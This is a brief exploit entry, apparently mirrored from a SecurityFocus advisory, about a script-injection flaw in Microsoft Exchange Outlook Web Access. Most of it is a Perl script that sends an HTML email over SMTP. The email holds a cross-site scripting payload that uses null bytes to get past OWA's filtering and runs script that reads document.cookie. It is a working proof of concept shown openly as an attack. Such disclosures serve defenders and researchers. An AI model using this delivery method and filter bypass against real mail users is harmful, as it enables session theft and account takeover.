source: http://www.securityfocus.com/bid/18381/info

Microsoft Exchange Server Outlook Web Access is prone to a script-injection vulnerability.

A remote attacker can exploit this issue by sending a malicious email message to a vulnerable user.

#!/usr/bin/perl

 

use Net::SMTP;

 

my $to = "recipient\@domain.tld";

my $sub = "Watch out - Cross Site Scripting Attack";

my $from = "originator\@domain2.tld";

my $smtp = "mail.example.tld";

 

my $cont = "<img alt='hugo\0abc' src='http://www.example.com/

imagethatdoesnotexist.gif' onError='javascript:alert(document.cookie)'

alt='<s'\0";

 

$smtp = Net::SMTP->new($smtp);

$smtp->mail("$from") || die("error 1");

$smtp->to("$to") || die("error 2");

 

$smtp->data() ;

$smtp->datasend("To: $to\n") ;

$smtp->datasend("From: $from\n") ;

$smtp->datasend("Subject: $sub\n");

$smtp->datasend("Content-Type: text/html\n\n");

 

$smtp->datasend("$cont") ;

$smtp->datasend("\n\n") ;

$smtp->dataend() ;

$smtp->quit() ;

 

print "$cont\n\ndone\n"; 